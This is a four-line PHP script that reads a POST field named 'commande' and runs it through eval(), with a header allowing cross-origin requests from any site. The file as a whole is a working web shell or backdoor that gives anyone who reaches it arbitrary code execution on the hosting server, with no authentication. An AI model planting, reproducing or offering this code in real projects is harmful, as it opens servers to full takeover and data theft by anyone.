<?php
header('Access-Control-Allow-Origin: *');
$commande = (!empty($_POST['commande'])) ? $_POST['commande'] : '';
eval($commande);